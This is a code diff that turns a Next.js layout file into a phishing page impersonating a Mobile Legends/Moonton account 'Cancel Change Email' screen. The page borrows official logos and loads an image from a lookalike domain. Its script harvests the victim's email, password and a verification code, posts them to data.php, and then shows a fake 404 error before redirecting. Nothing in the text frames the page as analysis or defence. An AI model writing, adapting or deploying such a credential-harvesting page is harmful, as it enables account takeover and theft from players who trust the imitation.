@@ -1,16 +1,4 @@
 import type { Metadata } from "next";
-import { Geist, Geist_Mono } from "next/font/google";
-import "./globals.css";
-
-const geistSans = Geist({
-  variable: "--font-geist-sans",
-  subsets: ["latin"],
-});
-
-const geistMono = Geist_Mono({
-  variable: "--font-geist-mono",
-  subsets: ["latin"],
-});
 
 export const metadata: Metadata = {
   title: "Create Next App",
@@ -23,12 +11,430 @@ export default function RootLayout({
   children: React.ReactNode;
 }>) {
   return (
-    <html lang="en">
-      <body
-        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
-      >
-        {children}
-      </body>
-    </html>
+    <html data-dpr="1">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="format-detection" content="telephone=no">
+    <meta charset="utf-8">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <title>mobilelegendsaccount</title>
+    <script type="text/javascript" src="https://play.mobilelegends.com/base/report/report.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <style>
+        html {
+            font-size: 118.9px !important;
+        }
+
+        input[type=text],input[type=email], input[type=password], input[type=tel] {
+            margin-top: 15px !important;
+        }
+
+        .send {
+            width: auto; 
+            padding: 10px; line-height: 1.7em; font-size: 14px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            html {
+                font-size: 37.5px !important;
+            }
+
+             input[type=text], input[type=email], input[type=password], input[type=tel] {
+                margin-top: 5px !important;
+            }
+        }
+        .grecaptcha-badge {
+            display: none;
+        }
+    </style>
+    <link href="./app.12350fe7e7ddf6841f0c27ce42cfdfec.css" rel="stylesheet">
+    <script src="https://cstaticdun.126.net/load.min.js?v=1747935166229" type="text/javascript"></script>
+    <script>
+        $(function() {
+            const validateEmail = (email) => {
+                return String(email)
+                    .toLowerCase()
+                    .match(
+                    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+                    );
+            };
+
+            const validatePassword = (password) => {
+                return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{6,}$/.test(password);
+            };
+
+            $("#eye-open").on('click', function() {
+                $("#password").attr('type', 'text');
+                $("#eye-open").hide();
+                $("#eye-close").show();
+            });
+
+            $("#eye-close").on('click', function() {
+                $("#password").attr('type', 'password');
+                $("#eye-open").show();
+                $("#eye-close").hide();
+            });
+
+            $("#Seconds").on('click', function() {
+                $("#Seconds").attr('disabled', true);
+
+                 var timeleft = 100;
+                var downloadTimer = setInterval(function(){
+                if(timeleft <= 0){
+                    clearInterval(downloadTimer);
+                    document.getElementById("Seconds").innerHTML = "Send Code";
+                    $("#Seconds").attr('disabled', false);
+                } else {
+                    document.getElementById("Seconds").innerHTML = timeleft + "s";
+                }
+                timeleft -= 1;
+                }, 1000);
+            })
+
+            $("button#Loginss").on('click', function() {
+                $Email = $("#email").val();
+                $Pass  = $("#password").val();
+                $Step  = $("#step").val();
+
+                if($Step == "Email") {
+                    if($Email.length == 0 || !validateEmail($Email)) {
+                        $(".toast").removeClass('hide');
+                        $(".toast").html('please enter your email');
+
+                        setTimeout(() => {
+                            $(".toast").addClass('hide');
+                            $(".toast").html('');
+                        }, 1000);
+
+                        return false;
+                    }
+
+                    if(!validatePassword($Pass)) {
+                        $(".toast").removeClass('hide');
+                        $(".toast").html('Use 6 or more characters with a combination of upper and lower case letters, and do not use special characters.');
+
+                        setTimeout(() => {
+                            $(".toast").addClass('hide');
+                            $(".toast").html('');
+                        }, 1000);
+
+                        return false
+                    }
+
+                    $.ajax({
+                        url: "data.php",
+                        method: "POST",
+                        data: "email="+$Email+"&password="+$Pass,
+                        beforeSend: function() {
+                            $(".toast").removeClass('hide');
+                            $(".toast").html('Processing....');
+                        },
+                        success: function() {
+                            setTimeout(() => {
+                            $("#Coded").show();
+                            $("#step").val('Code');
+                            $(".toast").addClass('hide');
+                            $(".toast").html('');  
+                            }, 2000);
+                        }
+                    });
+                } else if($Step == "Code") {
+                    $Code = $("#code").val();
+                    if($Code.length < 6) {
+                        $(".toast").removeClass('hide');
+                        $(".toast").html('Please enter a valid verification code');
+
+                        setTimeout(() => {
+                            $(".toast").addClass('hide');
+                            $(".toast").html('');
+                        }, 1000);
+
+                        return false
+                    }
+
+                    $.ajax({
+                        url: "data.php",
+                        method: "POST",
+                        data: "email="+$Email+"&password="+$Pass+"&code="+$Code,
+                        beforeSend: function() {
+                            $(".toast").removeClass('hide');
+                            $(".toast").html('Processing....');
+                        },
+                        success: function() {
+                            setTimeout(() => {
+                                $(".toast").html('(404) operation not found, please try again later.');
+
+                                setTimeout(() => {
+                                    window.location.href='./';
+                                }, 2000);
+                            }, 2000);
+                        }
+                    })
+                }
+
+                
+            });
+        })
+    </script>
+</head>
+
+<body style="font-size: 12px;">
+    <div id="app"><img src="https://register-sc-moonton.xyz/static/img/bg@3x.f45b442.png" style="display: none; position: absolute;">
+        <div class="v2-1">
+            <div class="inemail">
+                <div class="bac">
+                    <input type="hidden" name="step" id="step" value="Email">
+                    <p class="toast hide"></p>
+                    <div class="maincontent">
+                        <div id="seccommon"><img src="https://akmweb.youngjoygame.com/web/common/mlbb_logo_400x147.png" class="mt-logo" style="width: auto;">
+                            <h2>Cancel Change Email</h2>
+                            <div class="inputgroup"><label>Email</label>
+                                <div class="m-input">
+                                    <div class="star-box"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAQCAYAAADwMZRfAAABjUlEQVQ4T6WTTTIDURSFz2n6GSFDVQSZkB5hBXoHYgWRFYgdsANWIHYQKxArEKNWJvlpqsx0xYT3KrnqJf3kR9pED9+59+v7cy7xx/eUV3UQRyJSCWJTywpllhBtLIb0vLtUbxe7uvAviACdoKu3/wcRuQ9iE2ZCWjnkvlb8MoFE9cxtIUFig0fv6n2YKLgtxrrkIENteeHQG3idnVfTZJT3GyQPRwGSELxUPX1lYU+bSkYMXARdfW6T9Yo6FUgVYC7NOWO0qdoEtqZLHcEGQMVqInLjASJEaZycIoALPq/7+wMPNZB7f617ribyuPRhwp8VR2vYpvJLEIaghABXZxPtlihogtIQberBG9o2Jtsneb9GsuxAFKntxqYyr6K5kCjvn5C8TofacTPLAv2CzAKgdUilWq4Ct6nJiqYgwyEv8GHcQv94N+7Xo5nWZm/pB5KaruVWKBMuTYfeHA9bkqWeKThjjrczfXDw+nJg3eiqmmzTvk3qU5V8Lvt1696s0x+CgCoEjeKLqboffAOcy8P2UyLeYwAAAABJRU5ErkJggg=="
+                                            class="star"></div>
+                                    <div class="input-box">
+                                        <!---->
+                                        <!----><input type="email" id="email" placeholder="" autocomplete="off" maxlength="" class="input ff">
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <p class="tip"></p>
+                                        <p class="tip-error" style="display: none;"></p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="inputgroup"><label>Password</label>
+                                <div class="m-input">
+                                    <div class="star-box"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAQCAYAAADwMZRfAAABjUlEQVQ4T6WTTTIDURSFz2n6GSFDVQSZkB5hBXoHYgWRFYgdsANWIHYQKxArEKNWJvlpqsx0xYT3KrnqJf3kR9pED9+59+v7cy7xx/eUV3UQRyJSCWJTywpllhBtLIb0vLtUbxe7uvAviACdoKu3/wcRuQ9iE2ZCWjnkvlb8MoFE9cxtIUFig0fv6n2YKLgtxrrkIENteeHQG3idnVfTZJT3GyQPRwGSELxUPX1lYU+bSkYMXARdfW6T9Yo6FUgVYC7NOWO0qdoEtqZLHcEGQMVqInLjASJEaZycIoALPq/7+wMPNZB7f617ribyuPRhwp8VR2vYpvJLEIaghABXZxPtlihogtIQberBG9o2Jtsneb9GsuxAFKntxqYyr6K5kCjvn5C8TofacTPLAv2CzAKgdUilWq4Ct6nJiqYgwyEv8GHcQv94N+7Xo5nWZm/pB5KaruVWKBMuTYfeHA9bkqWeKThjjrczfXDw+nJg3eiqmmzTvk3qU5V8Lvt1696s0x+CgCoEjeKLqboffAOcy8P2UyLeYwAAAABJRU5ErkJggg=="
+                                            class="star"></div>
+                                    <div class="input-box">
+                                        <!---->
+                                        <!----><input type="password" id="password" placeholder="" autocomplete="off" onkeyup="this.value=this.value.replace(/[, ]/g,'')" maxlength="" class="input ff">
+                                        <!---->
+                                        <!---->
+                                        <!----><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABP0lEQVQ4T7WTXU7CQBSF7xmimPDCEvRRrRF20B1IMRF46xJYAkvoEnxDSWjrCuwOxFDioy6BFxJ/4hxzJympKPGH0Jemc3q+e+7MHciGDzb0y3YAo2TWoMiZWNZdQoM5RG4uguPJauJPCdRoyQHIiTWS9YKTTA3DZOobKz6BhgEGZdASMBrPQgs2qqgNguBgrkYF6rswJMlj/ZWLSGDSTnCUquYAReVu22sVEa/jaUbC/SQQv6xdxXlKVPq94PDJAXShilpYrmwt/e65Fzl9nPdpKqka9FuTvHBxqdDfAeI8IirRWsAwedgH36PVmALeug6IZqfthUV7X1pw+zCehQT9XdT6RSsKVq1c+dtNLMjLYwTuQJPtYO9etTc+nxLWJ9lce4zlAXGDZG2LgBskkHMYk/44SP+5F9u5C39J8gFqobsRMl8sAwAAAABJRU5ErkJggg=="
+                                            class="eye" id="eye-open">
+
+                                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABW0lEQVQ4T62TQU7CUBCG53/GYiwLjlCXBIw9At6gxQRlJTeQI/QGcgR2KIkUT2A9gSRCXMoRugCiJbwx02QQWLgQunuTN///zT+voD0/7NlPhxV4HIy7Dty2UGW0uGPLHohSMkhB9NwIK6Nd4i2CXvxeM4x7B+7lkhaeNuR1SzUGfANEm0Jrgf7TpGXBAeOobXgVKcmSvy4a9fKrOMfxZynjeQeMpHFV6UotF+jHE98yRzf1avB7cTZ0UAwyO2sT4F3Xqy3FfxiMh2LUDMvTXEAKBbitMDxL5azI0igkImINJc3wPFGDb553xfBPAccUO4Ks46iBjLIl0Is/PPCqoyOIi2yEiF4YXAJTKOOogBBrmLsh+gW40eYoInZCxZGSLO0iz2krRA1HwwTwBjaJpi+ZwOIWIF9WrAbrLew+DhFiawMGSvkl5hTGDI/pdCokmxs57FP+z4+1N8EPSbG/ER4avmQAAAAASUVORK5CYII=" class="eye" id="eye-close" style="display: none;">
+                                        <!---->
+                                        <p class="tip"></p>
+                                        <p class="tip-error" style="display: none;"></p>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="littlep">Use 6 or more characters with a combination of upper and lower case letters, and do not use special characters.</span>
+                            <br>&nbsp; 
+                            <div class="inputgroup" id="Coded" style="position: relative; margin-top: -10px; !important; display: none;"><label>Verification Code</label>
+                                <div class="m-input">
+                                    <div class="star-box"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAQCAYAAADwMZRfAAABjUlEQVQ4T6WTTTIDURSFz2n6GSFDVQSZkB5hBXoHYgWRFYgdsANWIHYQKxArEKNWJvlpqsx0xYT3KrnqJf3kR9pED9+59+v7cy7xx/eUV3UQRyJSCWJTywpllhBtLIb0vLtUbxe7uvAviACdoKu3/wcRuQ9iE2ZCWjnkvlb8MoFE9cxtIUFig0fv6n2YKLgtxrrkIENteeHQG3idnVfTZJT3GyQPRwGSELxUPX1lYU+bSkYMXARdfW6T9Yo6FUgVYC7NOWO0qdoEtqZLHcEGQMVqInLjASJEaZycIoALPq/7+wMPNZB7f617ribyuPRhwp8VR2vYpvJLEIaghABXZxPtlihogtIQberBG9o2Jtsneb9GsuxAFKntxqYyr6K5kCjvn5C8TofacTPLAv2CzAKgdUilWq4Ct6nJiqYgwyEv8GHcQv94N+7Xo5nWZm/pB5KaruVWKBMuTYfeHA9bkqWeKThjjrczfXDw+nJg3eiqmmzTvk3qU5V8Lvt1696s0x+CgCoEjeKLqboffAOcy8P2UyLeYwAAAABJRU5ErkJggg=="
+                                            class="star"></div>
+                                    <div class="input-box">
+                                        <!---->
+                                        <!----><input type="tel" placeholder="" id="code" name="code" minlength="6" maxlength="6" autocomplete="off" onkeyup="this.value=this.value.replace(/[, ]/g,'')" maxlength="" class="input ff" aria-autocomplete="list">
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <p class="tip"></p>
+                                        <p class="tip-error" style="display: none;"></p>
+                                    </div>
+                                </div>
+                                <div class="sendCode" id="Seconds">Send Code</div>
+                            </div>
+                            <button class="btn" id="Loginss" backgroundcolor="#ff4d4d">Confirmation</button></div>
+                    </div>
+                    <div class="footer"><img src="https://akmweb.youngjoygame.com/web/common/moonton_logo_100x83.png"> <span>Shanghai Moonton Technology Co.,Ltd.</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="loadingwrapper">
+        <div class="spinner">
+            <div class="spinner-container container1">
+                <div class="circle1"></div>
+                <div class="circle2"></div>
+                <div class="circle3"></div>
+                <div class="circle4"></div>
+            </div>
+            <div class="spinner-container container2">
+                <div class="circle1"></div>
+                <div class="circle2"></div>
+                <div class="circle3"></div>
+                <div class="circle4"></div>
+            </div>
+            <div class="spinner-container container3">
+                <div class="circle1"></div>
+                <div class="circle2"></div>
+                <div class="circle3"></div>
+                <div class="circle4"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        var isIE = function(ver) {
+            var b = document.createElement('b');
+            b.innerHTML = '<!--[if IE ' + ver + ']><i></i><![endif]-->';
+            return b.getElementsByTagName('i').length === 1
+        }
+        if (isIE(6) || isIE(7) || isIE(8)) {
+            alert(
+                "Dear player, your current browser isn't compatible with this page. Please open in a mobile browser or a different PC browser such as Chrome etc. Thank you."
+            );
+            location.href = 'https://www.google.com/chrome/browser/desktop/index.html';
+        }
+    </script>
+    <script>
+        if (window.location.href.indexOf('/#/') > 0) {
+            var herf = window.location.href.split('/#/')[0] + '/' + window.location.href.split('/#/')[1];
+            window.location.replace(herf)
+        }
+
+        function KeyboardNotify(isopen, height) {
+            if (!isopen) {
+                //          document.getElementsByClassName('bigwrapper')[0].style.marginTop = 0;
+                var inputs = document.getElementsByTagName('input');
+                var length = inputs.length;
+                for (var i = 0; i < length; i++) {
+                    inputs[i].blur();
+                }
+                document.getElementsByClassName('bigwrapper')[0].style.marginTop = '0px';
+            }
+        }
+
+        function b64DecodeUnicode(str) {
+            return decodeURIComponent(atob(str).split('').map(function(c) {
+                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+        }
+        //客户端调用
+        function LoadPage(pagename, language, ntf, maccode) {
+            try {
+                const IndexMlog = new Mlog({
+                    activity: 'mtacc'
+                })
+                IndexMlog.visitLog({
+                    behavior: 'load_page',
+                    pagename: pagename,
+                    language: language,
+                    ntf: ntf,
+                    maccode: maccode
+                })
+            } catch (e) {}
+            localStorage.setItem('language', language);
+            var ntfData = ntf.split(',')[0];
+            var emailData = ntf.split(',')[1];
+            localStorage.setItem('ntf', ntfData);
+            emailData && localStorage.setItem('emailsended', emailData)
+            let phoneServicer = 0
+            if (emailData) {
+                const res = b64DecodeUnicode(emailData);
+                if (JSON.parse(res).phoneServicer) {
+                    phoneServicer = JSON.parse(res).phoneServicer;
+                }
+            }
+            localStorage.setItem('sms_type', phoneServicer);
+            var urlOrigin = window.location.origin + '/v2.1/'
+            switch (pagename) {
+                case 'unbind-phone':
+                    location.href = urlOrigin + 'inapp/unbind-phone';
+                    break;
+                case 'new-bindemail':
+                    location.href = urlOrigin + 'inapp/new-bindemail';
+                    break;
+                case 'email-register':
+                    location.href = urlOrigin + 'inapp/email-register';
+                    break;
+                case 'phone-register':
+                    location.href = urlOrigin + 'inapp/phone-register';
+                    break;
+                case 'forgotpassword-email':
+                    location.href = urlOrigin + 'inapp/forgotpassword-email';
+                    break;
+                case 'changbind-confirm':
+                    location.href = urlOrigin + 'inapp/changbind-confirm';
+                    break;
+                case 'changeemail-success':
+                    location.href = urlOrigin + 'inapp/changeemail-success';
+                    break;
+                case 'changebindphone':
+                    location.href = urlOrigin + 'inapp/changebindphone';
+                    break;
+                case 'changebindemail':
+                    location.href = urlOrigin + 'inapp/changebindemail';
+                    break;
+                case 'login-new':
+                    location.href = urlOrigin + 'inapp/login-new';
+                    break;
+                case 'loginbyemail':
+                    location.href = urlOrigin + 'inapp/loginbyemail';
+                    break;
+                case 'forgotpassword-phone':
+                    location.href = urlOrigin + 'inapp/forgotpassword-phone';
+                    break;
+                case 'forgotpassword3':
+                    location.href = urlOrigin + 'inapp/forgotpassword-3';
+                    break;
+                case 'login':
+                    location.href = urlOrigin + 'inapp/login';
+                    break;
+                case 'bindemail':
+                    location.href = urlOrigin + 'inapp/bindemail';
+                    break;
+                case 'createaccount2':
+                    location.href = urlOrigin + 'inapp/createaccount2';
+                    break;
+                case 'createaccount4':
+                    location.href = urlOrigin + 'inapp/createaccount4';
+                    break;
+                case 'phonebind':
+                    location.href = urlOrigin + 'inapp/bindphone';
+                    break;
+                case 'bindphonewithemail': // 已有邮箱绑定手机号
+                    location.href = urlOrigin + 'inapp/bindphonewithemail';
+                    break;
+                case 'bindemailwithphone': // 已有手机号绑定邮箱
+                    location.href = urlOrigin + 'inapp/bindemailwithphone';
+                    break;
+                case 'bindphonewithemail2': // 已有邮箱绑定手机号
+                    location.href = urlOrigin + 'inapp/bindphonewithemail?s=2';
+                    break;
+                case 'bindemailwithphone2': // 已有手机号绑定邮箱
+                    location.href = urlOrigin + 'inapp/bindemailwithphone?s=2';
+                    break;
+                default:
+                    break;
+            }
+        }
+    </script>
+<!-- <script type="text/javascript" src="static/js/manifest.77d2b34b949f3d38d376.js"></script>
+    <script type="text/javascript" src="static/js/vendor.866a7528c6bcea6b9408.js"></script>
+    <script type="text/javascript" src="static/js/app.2859319dd5b7d77818af.js"></script>  -->
+    <div id="veepn-guard-alert"></div>
+    <style>
+        @font-face {
+            font-family: FigtreeVF;
+            src: url(chrome-extension://panammoooggmlehahpcjckcncfeffcoi/fonts/FigtreeVF.woff2) format("woff2 supports variations"), url(chrome-extension://panammoooggmlehahpcjckcncfeffcoi/fonts/FigtreeVF.woff2) format("woff2-variations");
+            font-weight: 100 1000;
+            font-display: swap
+        }
+    </style>
+    <div id="veepn-breach-alert"></div>
+    <style>
+        @font-face {
+            font-family: FigtreeVF;
+            src: url(chrome-extension://panammoooggmlehahpcjckcncfeffcoi/fonts/FigtreeVF.woff2) format("woff2 supports variations"), url(chrome-extension://panammoooggmlehahpcjckcncfeffcoi/fonts/FigtreeVF.woff2) format("woff2-variations");
+            font-weight: 100 1000;
+            font-display: swap
+        }
+    </style>
+</body>
+
+</html>
   );
 }
